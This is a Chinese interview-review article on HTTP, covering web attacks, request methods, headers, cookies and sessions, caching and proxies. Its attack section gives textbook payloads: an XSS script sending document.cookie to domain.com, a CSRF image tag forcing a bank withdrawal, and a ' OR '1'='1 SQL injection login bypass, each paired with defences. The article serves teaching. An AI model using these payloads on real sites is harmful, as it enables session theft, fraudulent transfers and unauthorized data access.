> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 https://mp.weixin.qq.com/s?__biz=MzU1NTA0NTEwMg==&mid=2247483816&idx=1&sn=0c25a0ff097009c8471c52ff72c857f7&chksm=fbdb1829ccac913f711d9f2cc4ab8759152e3c4a77f571fc9dd2178039c08038b5b734339894&scene=21#wechat_redirect

![](https://mmbiz.qpic.cn/mmbiz_png/qm3R3LeH8raC7icyNr2k1kWdrlFUPkVvMGaDS70n1NnDmxNMXywIUXkzFZ70ickbHYC3n866ZsX1FNUAicPEAibzyw/640?wx_fmt=png)HTTP 应知应会知识点复习手册

前言
==

本文快速回顾了常考的的知识点，用作面试复习，事半功倍。

面试知识点复习手册
=========

**全复习手册文章导航**

点击公众号下方：技术推文——面试冲刺

**已发布知识点复习手册**

*   [Java 基础知识点面试手册（上）](http://mp.weixin.qq.com/s?__biz=MzU1NTA0NTEwMg==&mid=2247483730&idx=1&sn=de2751593468f470902b698c19f8987f&chksm=fbdb18d3ccac91c56939e55cd1f0ca1b4753fd178d229440ecbf89752f5e0d518acd453e2497&scene=21#wechat_redirect)  
    
*   [Java 基础知识点面试手册（下）](http://mp.weixin.qq.com/s?__biz=MzU1NTA0NTEwMg==&mid=2247483730&idx=2&sn=5610afab774b4114110c993fd0fdc43d&chksm=fbdb18d3ccac91c5e3d2978e3a780b14d09e97c997a5c50410d1adb1930da76f40238d8f409d&scene=21#wechat_redirect)  
    
*   [Java 容器（List、Set、Map）知识点快速复习手册（上）](http://mp.weixin.qq.com/s?__biz=MzU1NTA0NTEwMg==&mid=2247483743&idx=1&sn=cc38aab9429905ddc757b529a386d1dd&chksm=fbdb18deccac91c8d0be8b3ae0e4266bb08ead73a2e57f2c977705e7b26ceaaec7aff5d5c67c&scene=21#wechat_redirect)  
    
*   [Java 容器（List、Set、Map）知识点快速复习手册（中）](http://mp.weixin.qq.com/s?__biz=MzU1NTA0NTEwMg==&mid=2247483753&idx=1&sn=74b8180dc1a1804c355174ed34e6e33d&chksm=fbdb18e8ccac91fe3ce31ed9713bf23598e7f98dcb6d5a22b79aa92b1c773134bfebe71fbbca&scene=21#wechat_redirect)  
    
*   [Java 容器（List、Set、Map）知识点快速复习手册（下）](http://mp.weixin.qq.com/s?__biz=MzU1NTA0NTEwMg==&mid=2247483762&idx=1&sn=1f121db6552a2e77d53c500fa812fc6c&chksm=fbdb18f3ccac91e58229dd3efd09c876722d58863c2b6ff6d444b0825a955a776ced947d8470&scene=21#wechat_redirect)  
    
*   [Redis 基础知识点快速复习手册（上）](http://mp.weixin.qq.com/s?__biz=MzU1NTA0NTEwMg==&mid=2247483768&idx=1&sn=ea83244e4b9f1d6f912ca0aadab74466&chksm=fbdb18f9ccac91efe9e32704ac3d69cf1ad390ddae0f169c118ea8b9da91c6e4e6e849677a6d&scene=21#wechat_redirect)  
    
*   [Redis 基础知识点快速复习手册（下）](http://mp.weixin.qq.com/s?__biz=MzU1NTA0NTEwMg==&mid=2247483773&idx=1&sn=6bbd589e174b5d6f8bb3d6b242eb6132&chksm=fbdb18fcccac91eaa8c9d941c1d3f8d2f3874841c417d30e3ccd185b1494d51ea2fdf384c876&scene=21#wechat_redirect)  
    
*   [Java 并发知识点快速复习手册（上）](http://mp.weixin.qq.com/s?__biz=MzU1NTA0NTEwMg==&mid=2247483778&idx=1&sn=124096cdc14958b8cdae04b805d00fdc&chksm=fbdb1803ccac9115e967cd538a8008a19dacea286a632284d2e8765c6b8bd48f4f235caddd29&scene=21#wechat_redirect)
    
*   [Java 并发知识点快速复习手册（下）](http://mp.weixin.qq.com/s?__biz=MzU1NTA0NTEwMg==&mid=2247483782&idx=1&sn=a0cd333ce6a32fa3f29cfae5fb6fe7e1&chksm=fbdb1807ccac9111003947936006f02972b45a6a6592f6d107f4dceb6b19c82fdff25b3ff355&scene=21#wechat_redirect)  
    
*   [Java 虚拟机知识点快速复习手册（上）](http://mp.weixin.qq.com/s?__biz=MzU1NTA0NTEwMg==&mid=2247483795&idx=1&sn=4f41e144656b6b6ab6089cd558f6f5ab&chksm=fbdb1812ccac9104e425b3984659ac422afbf0505268645be65935c33bad808d4571dfed5d1f&scene=21#wechat_redirect)  
    
*   [Java 虚拟机知识点快速复习手册（下）](http://mp.weixin.qq.com/s?__biz=MzU1NTA0NTEwMg==&mid=2247483801&idx=1&sn=97db60faa634ff18e335ba1f0851969c&chksm=fbdb1818ccac910e956fac57c4cd2b6c1906152aece1f5720aaf52f483b48d31b9506c3d34e5&scene=21#wechat_redirect)  
    
*   [阿里巴巴 Java 开发手册阅读笔记](http://mp.weixin.qq.com/s?__biz=MzU1NTA0NTEwMg==&mid=2247483796&idx=1&sn=b06e84f587a61f0f827c038d6e48de0e&chksm=fbdb1815ccac91032530f28473fc219bec68759b3fb54d7b21507238b6478b270f0f78b9d915&scene=21#wechat_redirect)
    
*   [HTTP 应知应会知识点复习手册（上）](http://mp.weixin.qq.com/s?__biz=MzU1NTA0NTEwMg==&mid=2247483812&idx=1&sn=a0f74e7ea7672b53b55ae20706b318ab&chksm=fbdb1825ccac913381547a47beb4acf7f895200d758413e1bfd168c098bbc0f0b1e83f04c60f&scene=21#wechat_redirect)  
    
*   [双非硕士的春招秋招经验总结——对校招，复习以及面试心态的理解](http://mp.weixin.qq.com/s?__biz=MzU1NTA0NTEwMg==&mid=2247483669&idx=1&sn=9d45d0a80c55c2b81611e150b059fb2f&chksm=fbdb1894ccac9182a43949d445accee91afab50f27c11906ae3d3121e24908469424d0726369&scene=21#wechat_redirect)
    
*   ...... 等（请查看全复习手册导航）
    

本文参考
====

本文内容主要参考来自 CyC2018 的 Github 仓库：CS-Notes

有删减，修改，补充额外增加内容

本作品采用知识共享署名 - 非商业性使用 4.0 国际许可协议进行许可。

----- 正文 -----
==============

Web 攻击技术
========

跨站脚本攻击 XSS
----------

还可参考：https://blog.csdn.net/lpjishu/article/details/50917092

### 1. 概念

跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。

例如有一个论坛网站，攻击者可以在上面发布以下内容：

```
<script>location.href="//domain.com/?c=" + document.cookie</script>


```

之后该内容可能会被渲染成以下形式：

```
<p><script>location.href="//domain.com/?c=" + document.cookie</script></p>


```

另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并**携带了当前作用域的 Cookie**。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。

### 2. 危害

*   **窃取用户的 Cookie 值**
    
*   **伪造虚假的输入表单骗取个人信息**
    
*   **显示伪造的文章或者图片**
    

### 3. 防范手段

**（一）设置 Cookie 为 HttpOnly**

设置了 HttpOnly 的 Cookie 可以**防止 JavaScript 脚本调用**，在一定程度上可以防止 XSS 窃取用户的 Cookie 信息。

**（二）过滤特殊字符**

许多语言都提供了对 HTML 的过滤：

*   PHP 的 htmlentities() 或是 htmlspecialchars()。
    
*   Python 的 cgi.escape()。
    
*   Java 的 xssprotect (Open Source Library)。
    
*   Node.js 的 node-validator。
    

例如 htmlspecialchars() 可以将 `<` 转义为 `&lt;`，将 `>` 转义为 `&gt;`，从而避免 HTML 和 Javascript 代码的运行。

**（三）富文本编辑器的处理**

富文本编辑器允许用户输入 HTML 代码，就不能简单地将 `<` 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。

富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，可以定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。

以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。

XSS 过滤在线测试

跨站请求伪造 CSRF
-----------

**XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。**

### 1. 概念

跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：**简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。**

假如一家银行用以执行转账操作的 URL 地址如下：

```
http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName。


```

那么，一个恶意攻击者可以在另一个网站上放置如下代码：

```
<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">。


```

**如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期**，那么她就会损失 1000 资金。

这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。

透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。

### 2. 防范手段

**（一）检查 Referer 字段**

HTTP 头中有一个 Referer 字段，这个字段用于标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer 字段应和请求的地址位于同一域名下，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，**篡改其 Referer 字段的可能。**

**（二）添加校验 Token**

由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行 CSRF 攻击。**这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数**。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。

**正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数**，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验 Token 的值为空或者错误，拒绝这个可疑请求。

**（三）要求用户输入验证码来进行校验。**

SQL 注入攻击
--------

### 1. 概念

服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。

### 2. 攻击原理

例如一个网站登录验证的 SQL 查询代码为：

```
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"


```

如果填入以下内容：

```
userName = "1' OR '1'='1";
passWord = "1' OR '1'='1";


```

那么 SQL 查询字符串为：

```
strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"


```

此时无需验证通过就能执行以下查询：

```
strSQL = "SELECT * FROM users;"


```

### 3. 防范手段

**（一）使用参数化查询（不进行拼接）**

以下以 Java 中的 PreparedStatement 为例，它是**预先编译的 SQL 语句，可以传入适当参数并且多次执行**。由于没有拼接的过程，因此可以防止 SQL 注入的发生。

```
PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE userid=? AND password=?");
stmt.setString(1, userid);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();


```

**（二）单引号转换**

**将传入的参数中的单引号转换为连续两个单引号**

**（三）检查变量数据类型和格式**

拒绝服务攻击
------

拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。

分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用网络上两个或以上被攻陷的电脑作为 “僵尸” 向特定的目标发动 “拒绝服务” 式攻击。

> 维基百科：拒绝服务攻击

基础概念
====

URI
---

URI 包含 URL 和 URN。

*   URI（Uniform Resource Identifier，统一资源标识符）
    
*   URL（Uniform Resource Locator，统一资源定位符）
    
*   URN（Uniform Resource Name，统一资源名称）
    

![](https://mmbiz.qpic.cn/mmbiz_png/qm3R3LeH8raC7icyNr2k1kWdrlFUPkVvMWBOibjRyHKwQgd4QslMfdicXlxedBIibJwclRV78ZqxuORc5tU5JSib0ZQ/640?wx_fmt=png)在这里插入图片描述

HTTP 请求报文和 HTTP 响应报文
--------------------

**HTTP 请求报文**

一个 HTTP 请求报文由请求行（request line）、请求头部（header）、空行和请求数据 4 个部分组成，下图给出了请求报文的一般格式。

```
＜request-line＞ 请求行
＜headers＞ 请求头
＜blank line＞ 空格
＜request-body＞ 请求数据


```

![](https://mmbiz.qpic.cn/mmbiz_png/qm3R3LeH8raC7icyNr2k1kWdrlFUPkVvMBx2eL3jBjFZNd1U63GeYXtw7OZm2Tkl8ryFS0ibicHcBJnYeugnXJMBA/640?wx_fmt=png)在这里插入图片描述  
**HTTP 响应报文**

HTTP 响应也由三个部分组成，分别是：状态行、消息报头、响应正文。

```
＜status-line＞
＜headers＞
＜blank line＞
＜response-body＞


```

![](https://mmbiz.qpic.cn/mmbiz_png/qm3R3LeH8raC7icyNr2k1kWdrlFUPkVvMPqyfHTvtwLnztgAYlH6Uc0aLvORwedf3J5OC6P6Bf0cEfQs6lSpyZA/640?wx_fmt=png)在这里插入图片描述

### GET

> 获取资源

当前网络请求中，绝大部分使用的是 GET 方法。

### HEAD

> 获取报文首部

和 GET 方法一样，但是不返回报文实体主体部分。

主要用于确认 URL 的有效性以及资源更新的日期时间等。

### POST

> 传输实体主体

POST 主要用来传输数据，而 GET 主要用来获取资源。

更多 POST 与 GET 的比较请见第八章。

### PUT

> 上传文件

由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，**一般不使用该方法**

### PATCH

> 对资源进行部分修改

PUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。

### DELETE

> 删除文件

与 PUT 功能相反，并且**同样不带验证机制。**

```
DELETE /file.html HTTP/1.1


```

### OPTIONS

> 查询支持的方法

查询指定的 URL 能够支持的方法。

会返回 Allow: GET, POST, HEAD, OPTIONS 这样的内容。

### CONNECT

> 要求用隧道协议连接代理

要求在与代理服务器通信时建立隧道，使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。

![](https://mmbiz.qpic.cn/mmbiz_png/qm3R3LeH8raC7icyNr2k1kWdrlFUPkVvMoJgJsU7wb0XcibOnZrqrKU60XNBsfVZ4EKHoUSvsVWqGp0OlONx6bnQ/640?wx_fmt=png)在这里插入图片描述

### TRACE

> 追踪路径

服务器会将通信路径返回给客户端。

发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。

通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪），因此更不会去使用它。

HTTP Header
===========

有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段。

各种首部字段及其含义如下（不需要全记，仅供查阅）：

通用首部字段
------

| 首部字段名 | 说明 |
| --- | --- |
| Cache-Control | 控制缓存的行为 |
| Connection | 控制不再转发给代理的首部字段、管理持久连接 |
| Date | 创建报文的日期时间 |
| Pragma | 报文指令 |
| Trailer | 报文末端的首部一览 |
| Transfer-Encoding | 指定报文主体的传输编码方式 |
| Upgrade | 升级为其他协议 |
| Via | 代理服务器的相关信息 |
| Warning | 错误通知 |

请求首部字段
------

| 首部字段名 | 说明 |
| --- | --- |
| Accept | 用户代理可处理的媒体类型 |
| Accept-Charset | 优先的字符集 |
| Accept-Encoding | 优先的内容编码 |
| Accept-Language | 优先的语言（自然语言） |
| Authorization | Web 认证信息 |
| Expect | 期待服务器的特定行为 |
| From | 用户的电子邮箱地址 |
| Host | 请求资源所在服务器 |
| If-Match | 比较实体标记（ETag） |
| If-Modified-Since | 比较资源的更新时间 |
| If-None-Match | 比较实体标记（与 If-Match 相反） |
| If-Range | 资源未更新时发送实体 Byte 的范围请求 |
| If-Unmodified-Since | 比较资源的更新时间（与 If-Modified-Since 相反） |
| Max-Forwards | 最大传输逐跳数 |
| Proxy-Authorization | 代理服务器要求客户端的认证信息 |
| Range | 实体的字节范围请求 |
| Referer | 对请求中 URI 的原始获取方 |
| TE | 传输编码的优先级 |
| User-Agent | HTTP 客户端程序的信息 |

### 响应首部字段

| 首部字段名 | 说明 |
| --- | --- |
| Accept-Ranges | 是否接受字节范围请求 |
| Age | 推算资源创建经过时间 |
| ETag | 资源的匹配信息 |
| Location | 令客户端重定向至指定 URI |
| Proxy-Authenticate | 代理服务器对客户端的认证信息 |
| Retry-After | 对再次发起请求的时机要求 |
| Server | HTTP 服务器的安装信息 |
| Vary | 代理服务器缓存的管理信息 |
| WWW-Authenticate | 服务器对客户端的认证信息 |

### 实体首部字段

| 首部字段名 | 说明 |
| --- | --- |
| Allow | 资源可支持的 HTTP 方法 |
| Content-Encoding | 实体主体适用的编码方式 |
| Content-Language | 实体主体的自然语言 |
| Content-Length | 实体主体的大小 |
| Content-Location | 替代对应资源的 URI |
| Content-MD5 | 实体主体的报文摘要 |
| Content-Range | 实体主体的位置范围 |
| Content-Type | 实体主体的媒体类型 |
| Expires | 实体主体过期的日期时间 |
| Last-Modified | 资源的最后修改日期时间 |

具体应用
====

Cookie
------

HTTP/1.1 引入 Cookie 来保存状态信息。

### 1. 用途

*   **会话状态管理**（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
    
*   **个性化设置**（如用户自定义设置、主题等）
    
*   **浏览器行为跟踪**（如跟踪分析用户行为等）
    

由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。

**新的浏览器 API 已经允许开发者直接将数据存储到本地**，如使用 Web storage API （本地存储和会话存储）或 IndexedDB。

### 2. 创建过程

```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]


```

客户端之后对同一个服务器发送请求时，会从浏览器中取出 Cookie 信息并通过 Cookie 请求首部字段发送给服务器。

```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry


```

### 3. 分类

*   会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。
    
*   持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）之后就成为了持久性的 Cookie。
    

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;


```

### 4. 作用域

Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则 Cookie 也包含在子域名中（如 developer.mozilla.org）。

Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F ("/") 作为路径分隔符，子路径也会被匹配。例如，设置 Path=/docs，则以下地址都会匹配：

*   /docs
    
*   /docs/Web/
    
*   /docs/Web/HTTP
    

### 5. JavaScript

通过 `Document.cookie` 属性可创建新的 Cookie，**也可通过该属性访问非 HttpOnly 标记的 Cookie。**

```
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);


```

### 6. Secure 和 HttpOnly

*   **标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端**。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。
    
*   **标记为 HttpOnly 的 Cookie 不能被 JavaScript 脚本调用**。因为跨域脚本 (XSS) 攻击常常使用 JavaScript 的 `Document.cookie` API 窃取用户的 Cookie 信息，因此使用 HttpOnly 标记可以在一定程度上避免 XSS 攻击。
    

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly


```

### 7. Session 和 cookie 选择

除了可以将用户信息通过 Cookie 存储在用户浏览器中，也可以利用 Session 存储在服务器端，存储在服务器端的信息更加安全。

Session 可以存储在服务器上的文件、数据库或者内存中。也可以将 Session 存储在 Redis 这种内存型数据库中，效率会更高。

使用 Session 维护用户登录状态的过程如下：

*   用户进行登录时，用户提交包含用户名和密码的表单，放入 HTTP 请求报文中；
    
*   服务器验证该用户名和密码，如果正确则把用户信息存储到 Redis 中，它在 Redis 中的 Key 称为 Session ID；
    
*   服务器返回的响应报文的 Set-Cookie 首部字段包含了这个 Session ID，客户端收到响应报文之后将该 Cookie 值存入浏览器中；
    
*   客户端之后对同一个服务器进行请求时会包含该 Cookie 值，服务器收到之后提取出 Session ID，从 Redis 中取出用户信息，继续之前的业务操作。
    

应该注意 Session ID 的安全性问题，不能让它被恶意攻击者轻易获取，那么就不能产生一个容易被猜到的 Session ID 值。此外，还需要经常重新生成 Session ID。在对安全性要求极高的场景下，例如转账等操作，除了使用 Session 管理用户状态之外，还需要对用户进行重新验证，比如重新输入密码，或者使用短信验证码等方式。

*   从存储方式上比较
    

*   Cookie 只能存储字符串，**如果要存储非 ASCII 字符串还要对其编码。**
    
*   Session 可以存储任何类型的数据，可以把 Session 看成是一个容器
    

*   从隐私安全上比较
    

*   Cookie 存储在浏览器中，对客户端是可见的。信息容易泄露出去。**如果使用 Cookie，最好将 Cookie 加密**
    
*   Session 存储在服务器上，对客户端是透明的。不存在敏感信息泄露问题。
    

*   从有效期上比较
    

*   Cookie 保存在硬盘中，只需要设置 maxAge 属性为比较大的正整数，即使关闭浏览器，Cookie 还是存在的
    
*   Session 的保存在服务器中，设置 maxInactiveInterval 属性值来确定 Session 的有效期。**并且 Session 依赖于名为 JSESSIONID 的 Cookie**，该 Cookie 默认的 maxAge 属性为 - 1。如果关闭了浏览器，该 Session 虽然没有从服务器中消亡，但也就失效了。
    

*   从对服务器的负担比较
    

*   Session 是保存在服务器的，每个用户都会产生一个 Session，如果是并发访问的用户非常多，是不能使用 Session 的，Session 会消耗大量的内存。
    
*   Cookie 是保存在客户端的。不占用服务器的资源。像 baidu、Sina 这样的大型网站，一般都是使用 Cookie 来进行会话跟踪。
    

*   从浏览器的支持上比较
    

*   如果浏览器禁用了 Cookie，那么 Cookie 是无用的了！
    
*   如果浏览器禁用了 Cookie，Session 可以通过 **URL 地址重写**来进行会话跟踪。
    

*   从跨域名上比较
    

*   Cookie 可以**设置 domain 属性来实现跨域名**
    
*   Session 只在当前的域名内有效，不可夸域名
    

缓存
--

### 1. 优点

*   缓解服务器压力；
    
*   减低客户端获取资源的延迟（缓存资源比服务器上的资源离客户端更近）。
    

### 2. 实现方法

*   让代理服务器进行缓存；
    
*   让客户端浏览器进行缓存。
    

### 3. Cache-Control

HTTP/1.1 通过 Cache-Control 首部字段来控制缓存。

**（一）禁止进行缓存**

no-store 指令规定不能对请求或响应的任何一部分进行缓存。

```
Cache-Control: no-store


```

**（二）强制确认缓存**

**no-cache 指令规定缓存服务器需要先向源服务器验证缓存资源的有效性，只有当缓存资源有效才将能使用该缓存对客户端的请求进行响应。**

```
Cache-Control: no-cache


```

**（三）私有缓存和公共缓存**

private 指令规定了将资源作为私有缓存，只能被单独用户所使用，一般存储在用户浏览器中。

```
Cache-Control: private


```

public 指令规定了将资源作为公共缓存，可以被多个用户所使用，一般存储在代理服务器中。

```
Cache-Control: public


```

**（四）缓存过期机制**

max-age 指令出现在请求报文中，并且缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。

max-age 指令出现在响应报文中，表示缓存资源在缓存服务器中保存的时间。

```
Cache-Control: max-age=31536000


```

Expires 字段也可以用于告知缓存服务器该资源什么时候会过期。在 HTTP/1.1 中，会优先处理 Cache-Control : max-age 指令；而在 HTTP/1.0 中，Cache-Control : max-age 指令会被忽略掉。

```
Expires: Wed, 04 Jul 2012 08:26:05 GMT


```

### 4. 缓存验证

需要先了解 ETag 首部字段的含义，它是资源的唯一表示。URL 不能唯一表示资源，例如 `http://www.google.com/` 有中文和英文两个资源，只有 ETag 才能对这两个资源进行唯一表示。

```
ETag: "82e22293907ce725faf67773957acd12"


```

可以将缓存资源的 ETag 值放入 If-None-Match 首部，服务器收到该请求后，判断缓存资源的 ETag 值和资源的最新 ETag 值是否一致，如果一致则表示缓存资源有效，返回 304 Not Modified。

```
If-None-Match: "82e22293907ce725faf67773957acd12"


```

Last-Modified 首部字段也可以用于缓存验证，它包含在源服务器发送的响应报文中，指示源服务器对资源的最后修改时间。但是它是一种弱校验器，**因为只能精确到一秒，所以它通常作为 ETag 的备用方案**。如果响应首部字段里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。服务器只在所请求的资源在给定的日期时间之后对内容进行过修改的情况下才会将资源返回，状态码为 200 OK。如果请求的资源从那时起未经修改，那么返回一个不带有消息主体的 304 Not Modified 响应，

```
Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT


```

```
If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT


```

连接管理
----

### 1. 短连接与长连接

*   HTTP/1.1 开始默认是长连接的，如果要断开连接，需要由客户端或者服务器端提出断开，使用 Connection : close；
    
*   HTTP/1.1 之前默认是短连接的，如果需要长连接，则使用 Connection : Keep-Alive。
    

### 2. 流水线

默认情况下，HTTP 请求是按顺序发出的，下一个请求只有在当前请求收到应答过后才会被发出。由于会受到网络延迟和带宽的限制，在下一个请求被发送到服务器之前，可能需要等待很长时间。

流水线是在同一条长连接上发出连续的请求，而不用等待响应返回，这样可以避免连接延迟。

内容协商
----

通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。

### 1. 类型

**1.1 服务端驱动型**

客户端设置特定的 HTTP 首部字段，例如 Accept、Accept-Charset、Accept-Encoding、Accept-Language，服务器根据这些字段返回特定的资源。

它存在以下问题：

*   服务器很难知道客户端浏览器的全部信息；
    
*   客户端提供的信息相当冗长（HTTP/2 协议的首部压缩机制缓解了这个问题），并且存在隐私风险（HTTP 指纹识别技术）；
    
*   给定的资源需要返回不同的展现形式，共享缓存的效率会降低，而服务器端的实现会越来越复杂。
    

**1.2 代理驱动型**

服务器返回 300 Multiple Choices 或者 406 Not Acceptable，客户端从中选出最合适的那个资源。

### 2. Vary

```
Vary: Accept-Language


```

在使用内容协商的情况下，只有当缓存服务器中的缓存满足内容协商条件时，才能使用该缓存，否则应该向源服务器请求该资源。

例如，一个客户端发送了一个包含 Accept-Language 首部字段的请求之后，源服务器返回的响应包含 `Vary: Accept-Language` 内容，缓存服务器对这个响应进行缓存之后，在客户端下一次访问同一个 URL 资源，并且 Accept-Language 与缓存中的对应的值相同时才会返回该缓存。

内容编码
----

内容编码将实体主体进行压缩，从而减少传输的数据量。常用的内容编码有：gzip、compress、deflate、identity。

浏览器发送 Accept-Encoding 首部，其中包含有它所支持的压缩算法，以及各自的优先级，服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且发送 Content-Encoding 首部来告知浏览器它选择了哪一种算法。由于该内容协商过程是基于编码类型来选择资源的展现形式的，在响应中，Vary 首部中至少要包含 Content-Encoding，这样的话，缓存服务器就可以对资源的不同展现形式进行缓存。

范围请求
----

如果网络出现中断，服务器只发送了一部分数据，范围请求可以使得客户端只请求服务器未发送的那部分数据，从而避免服务器重新发送所有数据。

### 1. Range

在请求报文中添加 Range 首部字段指定请求的范围。

```
GET /z4d4kWk.jpg HTTP/1.1
Host: i.imgur.com
Range: bytes=0-1023


```

请求成功的话服务器返回的响应包含 206 Partial Content 状态码。

### 2. Accept-Ranges

响应首部字段 Accept-Ranges 用于告知客户端是否能处理范围请求，可以处理使用 bytes，否则使用 none。

```
Accept-Ranges: bytes


```

### 3. 响应状态码

*   在请求成功的情况下，服务器会返回 206 Partial Content 状态码。
    
*   在请求的范围越界的情况下，服务器会返回 416 Requested Range Not Satisfiable 状态码。
    
*   在不支持范围请求的情况下，服务器会返回 200 OK 状态码。
    

分块传输编码
------

Chunked Transfer Coding，可以把数据分割成多块，让浏览器逐步显示页面。

多部分对象集合
-------

一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。

例如，上传多个表单时可以使用如下方式：

```
Content-Type: multipart/form-data; boundary=AaB03x

--AaB03x
Content-Disposition: form-data; 

Larry
--AaB03x
Content-Disposition: form-data; 
Content-Type: text/plain

... contents of file1.txt ...
--AaB03x--


```

虚拟主机
----

HTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。

通信数据转发
------

### 1. 代理

代理服务器接受客户端的请求，并且转发给其它服务器。

使用代理的主要目的是：

*   缓存
    
*   负载均衡
    
*   网络访问控制
    
*   访问日志记录
    

代理服务器分为正向代理和反向代理两种：

*   用户察觉得到正向代理的存在。
    
*   而反向代理一般位于内部网络中，用户察觉不到。
    

### 2. 网关

与代理服务器不同的是，网关服务器会将 HTTP 转化为其它协议进行通信，从而请求其它非 HTTP 服务器的服务。

### 3. 隧道

使用 SSL 等加密手段，为客户端和服务器之间建立一条安全的通信线路。

------ 正文完 ------
=================

关注我
===

我是蛮三刀把刀，目前为后台开发工程师。主要关注后台开发，网络安全，Python 爬虫等技术。

来微信和我聊聊：yangzd1102

Github：https://github.com/qqxx6661

### 原创博客主要内容

*   笔试面试复习知识点手册
    
*   Leetcode 算法题解析（前 150 题）
    
*   剑指 offer 算法题解析
    
*   Python 爬虫相关技术分析和实战
    
*   后台开发相关技术分析和实战
    

**同步更新以下博客**

**1. Csdn**

http://blog.csdn.net/qqxx6661

拥有专栏：Leetcode 题解（Java/Python）、Python 爬虫开发、面试助攻手册

**2. 知乎**

https://www.zhihu.com/people/yang-zhen-dong-1/

拥有专栏：码农面试助攻手册

**3. 掘金**

https://juejin.im/user/5b48015ce51d45191462ba55

**4. 简书**

https://www.jianshu.com/u/b5f225ca2376

### 个人公众号：Rude3Knife

